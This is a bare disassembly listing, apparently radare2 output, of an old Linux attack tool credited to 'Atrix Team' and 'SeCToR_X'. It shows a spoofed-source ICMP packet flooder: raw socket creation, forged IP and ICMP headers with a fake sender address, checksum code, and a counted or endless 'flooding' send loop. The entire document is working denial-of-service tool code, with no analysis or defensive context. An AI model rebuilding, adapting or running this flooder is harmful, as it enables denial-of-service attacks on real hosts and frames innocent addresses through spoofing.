xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push sym.__libc_csu_fini
push sym.__libc_csu_init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
push ebx
push eax
call 0x804863e
pop ebx
add ebx, 0x1b5a
mov eax, dword [ebx + 0x50]
test eax, eax
je 0x8048651
call eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push eax
push eax
cmp byte [obj.completed.1], 0
jne 0x804869c
mov eax, dword [obj.p.0]
mov edx, dword [eax]
test edx, edx
je 0x8048695
lea esi, [esi]
add eax, 4
mov dword [obj.p.0], eax
call edx
mov eax, dword [obj.p.0]
mov edx, dword [eax]
test edx, edx
jne 0x8048680
mov byte [obj.completed.1], 1
leave
ret
push ebp
mov ebp, esp
push ecx
push ecx
mov edx, dword [obj.__JCR_LIST__]
test edx, edx
je 0x80486c8
mov eax, 0
test eax, eax
je 0x80486c8
sub esp, 0xc
push obj.__JCR_LIST__
call loc.imp.__gmon_start__
add esp, 0x10
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
push edx
mov ebx, obj.__CTOR_LIST__
mov eax, dword [obj.__CTOR_LIST__]
cmp eax, 0xffffffff
je 0x8048ee0
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x8048ed4
pop eax
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x28
sub esp, 4
push 0
lea eax, [var_18h]
push eax
push dword [arg_8h]
call sym.resolve
add esp, 0x10
cmp eax, 0xffffffff
jne 0x8048891
sub esp, 8
push dword [arg_10h]
push str.error_on_trying_resolve__s_n
call sym.imp.printf
add esp, 0x10
mov dword [var_1ch], 0xffffffff
jmp 0x80488a0
mov edx, dword [arg_ch]
mov eax, dword [var_14h]
mov dword [edx], eax
mov dword [var_1ch], 0
mov eax, dword [var_1ch]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
sub esp, 4
push str.dest_address
push obj.dest_addr
push dword [arg_8h]
call sym.resolve_one
add esp, 0x10
test eax, eax
je 0x80488d0
mov dword [var_4h], 0xffffffff
jmp 0x8048921
cmp dword [arg_ch], 0
je 0x80488fb
sub esp, 4
push str.spoof_address
push obj.spoof_addr
push dword [arg_ch]
call sym.resolve_one
add esp, 0x10
test eax, eax
je 0x80488fb
mov dword [var_4h], 0xffffffff
jmp 0x8048921
mov eax, dword [obj.spoof_addr]
mov dword [0x804a20c], eax
mov word [obj.spoofaddr], 2
mov eax, dword [obj.dest_addr]
mov dword [0x804a220], eax
mov word [obj.destaddr], 2
mov eax, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
sub esp, 0xc
push str.Atrix_Team_1994__2000___by_SeCToR_X_n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push str.Visit_www.atrix.cjb.net_for_more_info_and_programs_n_n
call sym.imp.printf
add esp, 0x10
sub esp, 8
push dword [arg_8h]
push str.usage__s_fakeip_targetip__count___packetsize___wait__n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
jmp dword [reloc.printf]
jmp dword [reloc.exit]
push ebp
mov ebp, esp
push ebx
sub esp, 0x14
sub esp, 8
push 0x10
push dword [s1]
call sym.imp.bzero
add esp, 0x10
sub esp, 0xc
push dword [arg_8h]
call sym.imp.gethostbyname
add esp, 0x10
mov dword [var_8h], eax
cmp dword [var_8h], 0
jne 0x80487f4
sub esp, 4
push dword [arg_8h]
push str.error_on_trying_resolve__s
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push 0x8048ff1
call sym.imp.perror
add esp, 0x10
mov dword [var_ch], 0xffffffff
jmp 0x8048843
mov edx, dword [s1]
mov eax, dword [var_8h]
mov ax, word [eax + 8]
mov word [edx], ax
sub esp, 4
mov eax, dword [var_8h]
push dword [eax + 0xc]
mov eax, dword [var_8h]
mov eax, dword [eax + 0x10]
push dword [eax]
mov eax, dword [s1]
add eax, 4
push eax
call sym.imp.memcpy
add esp, 0x10
mov ebx, dword [s1]
mov eax, dword [arg_10h]
and eax, 0xffff
sub esp, 0xc
push eax
call sym.imp.htons
add esp, 0x10
mov word [ebx + 2], ax
mov dword [var_ch], 0
mov eax, dword [var_ch]
mov ebx, dword [var_4h]
leave
ret
mov eax, loc.__fini_array_end
push ebp
sub eax, loc.__fini_array_end
mov ebp, esp
sar eax, 2
push ebx
test eax, eax
push edx
lea ebx, [eax - 1]
jne 0x8048ea1
pop eax
pop ebx
pop ebp
jmp sym._fini
call dword [ebx*4 + loc.__fini_array_end]
mov edx, ebx
dec ebx
test edx, edx
jne 0x8048ea1
jmp 0x8048e99
push ebp
mov ebp, esp
sub esp, 8
call sym.call_gmon_start
call sym.frame_dummy
call sym.__do_global_ctors_aux
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
xor ebx, ebx
call sym._init
mov eax, loc.__fini_array_end
sub eax, loc.__fini_array_end
sar eax, 2
cmp ebx, eax
jae 0x8048e7c
mov esi, eax
nop
call dword [ebx*4 + loc.__fini_array_end]
inc ebx
cmp ebx, esi
jb 0x8048e70
pop ebx
pop esi
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x18
and esp, 0xfffffff0
mov eax, 0
sub esp, eax
cmp dword [argv], 5
jg 0x8048b9e
sub esp, 0xc
mov eax, dword [envp]
push dword [eax]
call sym.usage
add esp, 0x10
mov eax, dword [envp]
add eax, 4
mov eax, dword [eax]
mov dword [obj.spoof_name], eax
mov eax, dword [envp]
add eax, 8
mov eax, dword [eax]
mov dword [obj.dest_name], eax
mov eax, dword [envp]
add eax, 0xc
sub esp, 0xc
push dword [eax]
call sym.imp.atoi
add esp, 0x10
mov dword [obj.pingnmbr], eax
mov eax, dword [envp]
add eax, 0x10
sub esp, 0xc
push dword [eax]
call sym.imp.atoi
add esp, 0x10
mov dword [obj.pingsize], eax
mov eax, dword [envp]
add eax, 0x14
sub esp, 0xc
push dword [eax]
call sym.imp.atoi
add esp, 0x10
mov dword [obj.pingsleep], eax
sub esp, 8
push dword [obj.spoof_name]
push dword [obj.dest_name]
call sym.resolve_all
add esp, 0x10
sub esp, 4
push 0xff
push 3
push 2
call sym.imp.socket
add esp, 0x10
mov dword [var_4h], eax
push dword [obj.pingsize]
push dword [obj.dest_addr]
push dword [obj.spoof_addr]
push dword [var_4h]
call sym.icmp_send
add esp, 0x10
cmp eax, 0xffffffff
jne 0x8048c75
sub esp, 0xc
push str.error_sending_packet_n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push 0x8048ff1
call sym.imp.perror
add esp, 0x10
jmp 0x8048e41
mov dword [var_ch], 0
cmp dword [obj.pingnmbr], 0
je 0x8048d84
cmp dword [obj.pingnmbr], 0
je 0x8048d84
sub esp, 0xc
push str.Sending_pakcet..._n
call sym.imp.printf
add esp, 0x10
mov dword [var_8h], 0
mov eax, dword [var_8h]
cmp eax, dword [obj.pingnmbr]
jb 0x8048cbd
jmp 0x8048d69
push dword [obj.pingsize]
push dword [obj.dest_addr]
push dword [obj.spoof_addr]
push dword [var_4h]
call sym.icmp_send
add esp, 0x10
cmp eax, 0xffffffff
jne 0x8048cef
sub esp, 0xc
push str.error_on_sending_packet_n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
mov edx, dword [obj.pingsleep]
mov eax, edx
shl eax, 2
add eax, edx
lea edx, [eax*4]
add eax, edx
lea edx, [eax*4]
add eax, edx
shl eax, 3
push eax
call sym.imp.usleep
add esp, 0x10
mov edx, dword [var_ch]
inc edx
mov eax, 0x19
mov ecx, eax
mov eax, edx
sar edx, 0x1f
idiv ecx
mov eax, edx
mov dword [var_ch], eax
test eax, eax
jne 0x8048d5f
sub esp, 8
push 0x804906b
push dword [obj.stdout]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push dword [obj.stdout]
call sym.imp.fflush
add esp, 0x10
lea eax, [var_8h]
inc dword [eax]
jmp 0x8048cad
sub esp, 8
push dword [obj.pingnmbr]
push str._ncomplete___u_packets_sent_n
call sym.imp.printf
add esp, 0x10
jmp 0x8048e41
sub esp, 0xc
push str.flooding___.__25_packets_n
call sym.imp.printf
add esp, 0x10
mov dword [var_8h], 0
cmp dword [var_8h], 0
jle 0x8048da6
jmp 0x8048e41
push dword [obj.pingsize]
push dword [obj.dest_addr]
push dword [obj.spoof_addr]
push dword [var_4h]
call sym.icmp_send
add esp, 0x10
cmp eax, 0xffffffff
jne 0x8048dea
sub esp, 0xc
push str.error_sending_packet_n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push 0x8048ff1
call sym.imp.perror
add esp, 0x10
jmp 0x8048e41
sub esp, 0xc
push 0x384
call sym.imp.usleep
add esp, 0x10
mov edx, dword [var_ch]
inc edx
mov eax, 0x19
mov ecx, eax
mov eax, edx
sar edx, 0x1f
idiv ecx
mov eax, edx
mov dword [var_ch], eax
test eax, eax
jne 0x8048d9b
sub esp, 8
push 0x804906b
push dword [obj.stdout]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push dword [obj.stdout]
call sym.imp.fflush
add esp, 0x10
jmp 0x8048d9b
mov eax, dword [var_10h]
leave
ret
push ebp
mov ebp, esp
push ebx
push edx
call 0x8048eee
pop ebx
add ebx, 0x12aa
call sym.__do_global_dtors_aux
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x1430
lea eax, [s]
mov dword [var_141ch], eax
lea eax, [s]
add eax, 0x14
mov dword [var_1420h], eax
lea eax, [s]
add eax, 0x1c
mov dword [var_1424h], eax
lea eax, [s]
add eax, dword [arg_14h]
add eax, 0x30
mov dword [var_1428h], eax
sub esp, 4
push 0x1402
push 0
lea eax, [s]
push eax
call sym.imp.memset
add esp, 0x10
mov edx, dword [var_141ch]
mov al, byte [edx]
and eax, 0xf
or eax, 0x40
mov byte [edx], al
mov edx, dword [var_141ch]
mov al, byte [edx]
and eax, 0xfffffff0
or eax, 5
mov byte [edx], al
mov esi, dword [var_141ch]
mov bl, 0xff
call sym.imp.random
mov edx, eax
mov eax, 0xf
mov ecx, eax
mov eax, edx
sar edx, 0x1f
idiv ecx
mov al, bl
sub al, dl
mov byte [esi + 8], al
mov eax, dword [var_141ch]
mov byte [eax + 9], 1
mov ebx, dword [var_141ch]
mov eax, dword [arg_14h]
add eax, 0x38
and eax, 0xffff
sub esp, 0xc
push eax
call sym.imp.htons
add esp, 0x10
mov word [ebx + 2], ax
sub esp, 4
push 4
mov eax, dword [var_141ch]
add eax, 0x10
push eax
push 0x804a220
call sym.imp.bcopy
add esp, 0x10
sub esp, 4
push 4
mov eax, dword [var_141ch]
add eax, 0xc
push eax
push 0x804a20c
call sym.imp.bcopy
add esp, 0x10
mov ebx, dword [var_141ch]
sub esp, 8
push 0x14
lea eax, [s]
push eax
call sym.in_cksum
add esp, 0x10
mov word [ebx + 0xa], ax
mov edx, dword [var_1424h]
mov al, byte [edx]
and eax, 0xf
or eax, 0x40
mov byte [edx], al
mov edx, dword [var_1424h]
mov al, byte [edx]
and eax, 0xfffffff0
or eax, 5
mov byte [edx], al
mov esi, dword [var_1424h]
mov ebx, dword [var_141ch]
call sym.imp.random
mov edx, eax
mov eax, 0xf
mov ecx, eax
mov eax, edx
sar edx, 0x1f
idiv ecx
mov al, byte [ebx + 8]
sub al, dl
mov byte [esi + 8], al
mov eax, dword [var_1424h]
mov byte [eax + 9], 6
mov ebx, dword [var_1424h]
call sym.imp.random
mov edx, eax
mov eax, 0x45
mov ecx, eax
mov eax, edx
sar edx, 0x1f
idiv ecx
mov word [ebx + 2], dx
sub esp, 4
push 4
mov eax, dword [var_1424h]
add eax, 0xc
push eax
push 0x804a220
call sym.imp.bcopy
add esp, 0x10
mov ebx, dword [var_1424h]
sub esp, 8
push 0x14
push dword [var_1424h]
call sym.in_cksum
add esp, 0x10
mov word [ebx + 0xa], ax
mov ebx, dword [var_1428h]
mov eax, dword [arg_14h]
and eax, 0xffff
sub esp, 0xc
push eax
call sym.imp.htons
add esp, 0x10
and eax, 0xffff
mov dword [ebx], eax
mov eax, dword [var_1420h]
mov byte [eax], 8
mov eax, dword [var_1420h]
mov byte [eax + 1], 0
mov ebx, dword [var_1420h]
sub esp, 8
mov eax, dword [arg_14h]
add eax, 0x24
push eax
push dword [var_1420h]
call sym.in_cksum
add esp, 0x10
mov word [ebx + 2], ax
sub esp, 8
push 0x10
push obj.destaddr
push 0
mov eax, dword [arg_14h]
add eax, 0x38
push eax
lea eax, [s]
push eax
push dword [arg_8h]
call sym.imp.sendto
add esp, 0x20
lea esp, [var_8h]
pop ebx
pop esi
pop ebp
ret
jmp dword [reloc.memset]
jmp dword [reloc.random]
jmp dword [reloc.htons]
jmp dword [reloc.bcopy]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov edx, dword [arg_8h]
mov dword [var_ch], edx
mov dword [var_10h], 0
mov word [var_2h], 0
cmp dword [var_8h], 1
jg 0x8048736
jmp 0x804874e
mov eax, dword [var_ch]
mov ax, word [eax]
and eax, 0xffff
add dword [var_10h], eax
add dword [var_ch], 2
sub dword [var_8h], 2
jmp 0x804872e
cmp dword [var_8h], 1
jne 0x8048768
mov edx, dword [var_ch]
mov al, byte [edx]
mov byte [var_2h], al
mov ax, word [var_2h]
and eax, 0xffff
add dword [var_10h], eax
mov edx, dword [var_10h]
sar edx, 0x10
movzx eax, word [var_10h]
add edx, eax
mov dword [var_10h], edx
mov eax, dword [var_10h]
sar eax, 0x10
add dword [var_10h], eax
mov eax, dword [var_10h]
not eax
mov word [var_2h], ax
mov ax, word [var_2h]
and eax, 0xffff
leave
ret
jmp dword [reloc.sendto]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov eax, dword [eax + 4]
pop ebp
ret
jmp dword [reloc.usleep]
jmp dword [reloc.perror]
jmp dword [reloc.fprintf]
jmp dword [reloc.fflush]
jmp dword [reloc.memcpy]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.bzero]
jmp dword [reloc.atoi]
jmp dword [reloc.socket]
